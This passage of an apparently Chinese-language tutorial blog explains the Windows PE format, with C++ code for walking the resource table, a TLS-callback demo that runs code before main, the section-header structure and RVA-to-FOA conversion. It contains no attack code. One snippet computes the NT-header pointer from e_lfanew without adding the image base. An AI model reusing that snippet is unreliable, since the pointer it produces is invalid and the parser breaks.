class="title">IsPE_File</span><span class="params">(<span class="type">char</span>* lpImage)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AnalyzeResource</span><span class="params">(<span class="type">char</span>* lpImage)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">setlocale</span>(LC_ALL, <span class="string">&quot;chs&quot;</span>);</span><br><span class="line"><span class="built_in">InitResourceInfo</span>();</span><br><span class="line"><span class="comment">//1 打开文件</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line">PATH,</span><br><span class="line">GENERIC_ALL,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 获取文件大小</span></span><br><span class="line">DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//3 申请空间并初始化</span></span><br><span class="line"><span class="type">char</span>* buf = <span class="keyword">new</span> <span class="type">char</span>[dwFileSize] &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//4 读取文件</span></span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, buf, dwFileSize, &amp;dwRealSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//5 判断是不是PE文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsPE_File</span>(buf) == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;这是一个PE文件&quot;);</span></span><br><span class="line"><span class="built_in">AnalyzeResource</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这不是一个PE文件&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span>[]buf;</span><br><span class="line">buf = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="type">char</span>* lpImage, DWORD dwRva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> dwRva;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva = pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">if</span> (dwRva &gt;= dwSectionRva &amp;&amp; dwRva &lt; dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwFOA = dwRva - dwSectionRva + dwSectionFOA;</span><br><span class="line"><span class="keyword">return</span> dwFOA;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPE_File</span><span class="params">(<span class="type">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="keyword">if</span> (pDos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pNt-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AnalyzeResource</span><span class="params">(<span class="type">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 找到资源表的结构体</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOption =  &amp;pNt-&gt;OptionalHeader;</span><br><span class="line"><span class="comment">//1. 得到了资源表的数据目录</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pResourceDir= &amp;pOption-&gt;DataDirectory[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 得到资源表第一层的位置</span></span><br><span class="line">DWORD dwResourceFOA =  <span class="built_in">RvaToFoa</span>(lpImage, pResourceDir-&gt;VirtualAddress);</span><br><span class="line">PIMAGE_RESOURCE_DIRECTORY pFirstDir =(PIMAGE_RESOURCE_DIRECTORY)(dwResourceFOA + lpImage);</span><br><span class="line">PIMAGE_RESOURCE_DIRECTORY_ENTRY pFirstRes = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pFirstDir + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//3. 解析资源表</span></span><br><span class="line">DWORD dwFirstCount = pFirstDir-&gt;NumberOfIdEntries + pFirstDir-&gt;NumberOfNamedEntries;</span><br><span class="line"><span class="comment">//3.1 解析第一层</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dwFirstCount; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//解析第一层的名称信息</span></span><br><span class="line"><span class="keyword">if</span> (pFirstRes[i].NameIsString == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//以字符串作为标识</span></span><br><span class="line">PIMAGE_RESOURCE_DIR_STRING_U pNameInfo = </span><br><span class="line">(PIMAGE_RESOURCE_DIR_STRING_U)(pFirstRes[i].NameOffset + (DWORD)pFirstDir);</span><br><span class="line">WCHAR* pName = <span class="keyword">new</span> WCHAR[pNameInfo-&gt;Length + <span class="number">1</span>]&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//wcscpy_s(pName, pNameInfo-&gt;Length, pNameInfo-&gt;NameString);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">0</span>; m &lt; pNameInfo-&gt;Length; m++)</span><br><span class="line">&#123;</span><br><span class="line">pName[m] = pNameInfo-&gt;NameString[m];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;资源种类标识:%s\n&quot;</span>, pName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//以数字作为标识</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (g_mapResourceInfo.<span class="built_in">count</span>(pFirstRes[i].Id) == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;资源种类标识%s\n&quot;</span>, g_mapResourceInfo[pFirstRes[i].Id]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;资源种类标识%d\n&quot;</span>, pFirstRes[i].Id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解析第一层的位置信息，从而得到第二层</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pFirstRes[i].DataIsDirectory == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//根据偏移得到第二层的位置,以及数组</span></span><br><span class="line">PIMAGE_RESOURCE_DIRECTORY pSecondDir =</span><br><span class="line">(PIMAGE_RESOURCE_DIRECTORY)(pFirstRes[i].OffsetToDirectory + (DWORD)pFirstDir);</span><br><span class="line">PIMAGE_RESOURCE_DIRECTORY_ENTRY pSecondRes =</span><br><span class="line"><span class="built_in">PIMAGE_RESOURCE_DIRECTORY_ENTRY</span>(pSecondDir + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//第二层的资源个数</span></span><br><span class="line">DWORD dwSecondCount  = </span><br><span class="line">pSecondDir-&gt;NumberOfIdEntries + pSecondDir-&gt;NumberOfNamedEntries;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; dwSecondCount; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//解析第二层的名称信息</span></span><br><span class="line"><span class="keyword">if</span> (pSecondRes[j].NameIsString == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//以字符串作为标识</span></span><br><span class="line">PIMAGE_RESOURCE_DIR_STRING_U pNameInfo =</span><br><span class="line">(PIMAGE_RESOURCE_DIR_STRING_U)(pSecondRes[j].NameOffset + (DWORD)pFirstDir);</span><br><span class="line">WCHAR* pName = <span class="keyword">new</span> WCHAR[pNameInfo-&gt;Length + <span class="number">1</span>]&#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//wcscpy_s(pName, pNameInfo-&gt;Length + 1, pNameInfo-&gt;NameString);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">0</span>; m &lt; pNameInfo-&gt;Length; m++)</span><br><span class="line">&#123;</span><br><span class="line">pName[m] = pNameInfo-&gt;NameString[m];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;   资源标识:%s\n&quot;</span>, pName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;   资源标识:%d\n&quot;</span>, pSecondRes[j].Id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解析第二层的位置信息</span></span><br><span class="line"><span class="keyword">if</span> (pSecondRes[j].DataIsDirectory == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//根据偏移得到第三层的位置,以及数组</span></span><br><span class="line">PIMAGE_RESOURCE_DIRECTORY pThirdDir =</span><br><span class="line">(PIMAGE_RESOURCE_DIRECTORY)</span><br><span class="line">(pSecondRes[j].OffsetToDirectory+ (DWORD)pFirstDir);</span><br><span class="line">PIMAGE_RESOURCE_DIRECTORY_ENTRY pThirdRes =</span><br><span class="line">(PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pThirdDir + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//解析第三层，但是不需要循环了</span></span><br><span class="line">PIMAGE_RESOURCE_DATA_ENTRY pData = </span><br><span class="line">(PIMAGE_RESOURCE_DATA_ENTRY)(pThirdRes-&gt;OffsetToData + (DWORD)pFirstDir);</span><br><span class="line"><span class="comment">//pData-&gt;OffsetToData 资源起始位置的RVA</span></span><br><span class="line"><span class="comment">//pData-&gt;Size  资源的大小</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;            资源的起始RVA：%x  资源的大小：%x\n&quot;</span>, pData-&gt;OffsetToData, pData-&gt;Size);</span><br><span class="line"><span class="comment">//获取到资源的数据了，输出10个字节，用于对比</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* pRes = (<span class="type">unsigned</span> <span class="type">char</span> *)</span><br><span class="line">(<span class="built_in">RvaToFoa</span>(lpImage, pData-&gt;OffsetToData) + lpImage);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;            &quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> m= <span class="number">0</span>; m &lt; <span class="number">10</span>; m++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x  &quot;</span>, pRes[m]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TLS表"><a href="#TLS表" class="headerlink" title="TLS表"></a>TLS表</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>线程局部存储：可以将TLS全局变量，在每一个线程中都创建一份，从而解决一定的线程同步问题。</p><h4 id="测试代码-2"><a href="#测试代码-2" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">C++</span><br><span class="line"><span class="comment">// 03_TLS.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"><span class="type">int</span> g_nNum1 = <span class="number">100</span>;</span><br><span class="line">_declspec(thread) <span class="type">int</span> g_nNum2 = <span class="number">200</span>;<span class="comment">//TLS的全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// TLS回调函数A</span></span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">t_TlsCallBack_A</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Red)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (DLL_PROCESS_ATTACH == Reason)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i am a  mimidaima!\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (DLL_THREAD_DETACH == Reason) <span class="comment">// 如果线程退出则打印信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;t_TlsCallBack_A -&gt; ThreadDetach!\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// TLS回调函数B</span></span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">t_TlsCallBack_B</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Red)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (DLL_THREAD_DETACH == Reason) <span class="comment">// 如果线程退出则打印信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;t_TlsCallBack_B -&gt; ThreadDetach!\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 注册TLS回调函数，&quot;.CRT$XLB&quot;的含义是：</span></span><br><span class="line"><span class="comment">* CRT表明使用C RunTime机制</span></span><br><span class="line"><span class="comment">* X表示标识名随机</span></span><br><span class="line"><span class="comment">* L表示TLS callback section</span></span><br><span class="line"><span class="comment">* B其实也可以为B-Y的任意一个字母</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">PIMAGE_TLS_CALLBACK p_thread_callback[] = &#123;</span><br><span class="line">t_TlsCallBack_A,</span><br><span class="line">t_TlsCallBack_B,</span><br><span class="line"><span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">t_ThreadFun</span><span class="params">(PVOID pParam)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p  &quot;</span>, &amp;g_nNum1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;g_nNum2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p  &quot;</span>, &amp;g_nNum1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;g_nNum2);</span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, t_ThreadFun, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="区段表"><a href="#区段表" class="headerlink" title="区段表"></a>区段表</h2><h3 id="结构体数组"><a href="#结构体数组" class="headerlink" title="结构体数组"></a>结构体数组</h3><p>数组的元素个数由文件头中的NumberOfSection决定。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C++</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">    BYTE    Name[<span class="number">0x8</span>];                       <span class="comment">// (1) 区段名</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">            DWORD   PhysicalAddress; </span><br><span class="line">            DWORD   VirtualSize;                  <span class="comment">// (2) *区段大小</span></span><br><span class="line"> &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;<span class="comment">// (3)区段的RVA地址*</span></span><br><span class="line">    DWORD   SizeOfRawData;<span class="comment">// (4) 文件中的区段对齐大小*</span></span><br><span class="line">    DWORD   PointerToRawData;<span class="comment">// (5) 区段在文件中的偏移*</span></span><br><span class="line">    DWORD   PointerToRelocations;<span class="comment">// (6) 重定位的偏移（OBJ）</span></span><br><span class="line">    DWORD   PointerToLinenumbers;<span class="comment">// (7) 行号表的偏移（调试）</span></span><br><span class="line">    WORD    NumberOfRelocations;<span class="comment">// (8) 重定位项数量（OBJ）</span></span><br><span class="line">    WORD    NumberOfLinenumbers;<span class="comment">// (9) 行号表项数量</span></span><br><span class="line">    DWORD   Characteristics;<span class="comment">// (10) 区段的属性</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><h3 id="怎么找到区段表"><a href="#怎么找到区段表" class="headerlink" title="怎么找到区段表"></a>怎么找到区段表</h3><p>宏：IMAGE_FIRST_SECTION(NT头的地址)</p><p>计算：NT头的地址+0x4+0x14+0xE0</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打开PE文件后，第一个段就是DOS头部</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="comment">//pDos的e_lfanew字段可以指向NT头的空间，使用NT头接收</span></span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;</span><br><span class="line"><span class="comment">//使用IMAGE_FIRST_SECTION这个宏，传图NT头来获取区段表</span></span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br></pre></td></tr></table></figure><h4 id="区段表中的一个元素描述的就是一个区段的信息"><a href="#区段表中的一个元素描述的就是一个区段的信息" class="headerlink" title="区段表中的一个元素描述的就是一个区段的信息"></a>区段表中的一个元素描述的就是一个区段的信息</h4><p>1 Name：区段名</p><p>2 PointerToRawData 在文件中的位置 FOA</p><p>3 SizeOfRawData在文件中的大小</p><p>4 VirtualAddress在内存中的位置 RVA</p><p>5 Misc.VirtualSize:在内存中的大小</p><p>6 Characteristics:区段的属性：可读 可写 可执行。。。。</p><h4 id="区段表中的以下四个字段保存的是什么？"><a href="#区段表中的以下四个字段保存的是什么？" class="headerlink" title="区段表中的以下四个字段保存的是什么？"></a>区段表中的以下四个字段保存的是什么？</h4><p>VirtualAddress： 区段起始位置的RVA</p><p>PointerToRawData： 区段在文件中的起始偏移</p><p>VirtualSize： 区段在内存中的大小（没有对齐）</p><p>SizeOfRawData： 区段在文件中的大小（对齐过的）</p><p>是否VirtualSize 一定会小于SizeOfRawData？</p><p>不是的，有可能是这个区段在文件中没有数据，运行起来之后，才有数据。</p><h3 id="测试代码-3"><a href="#测试代码-3" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">C++</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AnalyzeNTHeader</span><span class="params">(<span class="type">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 找到NT头</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">    PIMAGE_FILE_HEADER pFileHeader = &amp;pNt-&gt;FileHeader;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pOption = &amp;pNt-&gt;OptionalHeader;</span><br><span class="line"><span class="comment">//2 开始解析文件头</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;运行平台:%x\n&quot;</span>,pFileHeader-&gt;Machine);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;区段数量:%x\n&quot;</span>, pFileHeader-&gt;NumberOfSections);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;扩展头大小:%x\n&quot;</span>, pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;时间戳:%x\n&quot;</span>, pFileHeader-&gt;TimeDateStamp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;属性:%x\n&quot;</span>, pFileHeader-&gt;Characteristics);</span><br><span class="line"><span class="comment">//3 解析扩展头</span></span><br><span class="line"><span class="comment">//。。。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AnalyzeSectionTable</span><span class="params">(<span class="type">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line"><span class="comment">//2 解析</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span>  i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;区段名：%s\t&quot;</span>, pHeader[i].Name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;内存中大小：%X\t&quot;</span>, pHeader[i].Misc.VirtualSize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;内存中RVA：%X\t&quot;</span>, pHeader[i].VirtualAddress);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件中大小：%X\t&quot;</span>, pHeader[i].SizeOfRawData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件中FOA：%X\t&quot;</span>, pHeader[i].PointerToRawData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;属性：%X\t&quot;</span>, pHeader[i].Characteristics);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RVA和FOA之间的转换"><a href="#RVA和FOA之间的转换" class="headerlink" title="RVA和FOA之间的转换"></a>RVA和FOA之间的转换</h2><p>文件偏移（FOA或者Offset）： 某一个数据距离文件开头的偏移</p><h3 id="RVA怎么转换成FOA"><a href="#RVA怎么转换成FOA" class="headerlink" title="RVA怎么转换成FOA"></a>RVA怎么转换成FOA</h3><p>RVA - RVA区段 = FOA -FOA区段</p><p>FOA = RVA - RVA区段+FOA区段</p><h3 id="一般情况下，PE文件的头部在文件中是多大？"><a href="#一般情况下，PE文件的头部在文件中是多大？" class="headerlink" title="一般情况下，PE文件的头部在文件中是多大？"></a>一般情况下，PE文件的头部在文件中是多大？</h3><p>0x400</p><h3 id="PE文件的头部在内存中是多大"><a href="#PE文件的头部在内存中是多大" class="headerlink" title="PE文件的头部在内存中是多大"></a>PE文件的头部在内存中是多大</h3><p>0x1000</p><p>RVA为0x600的时候，转为FOA 转不了，在文件中没有对应的位置</p><p>虚拟地址（VA）：程序在运行的时候，是将PE文件加载到进程的内存空间中。进程的这块内存空间就称之为 虚拟内存空间 32位程序虚拟内存空间是以字节为单位的，每一个字节都有一个编号从0x0000 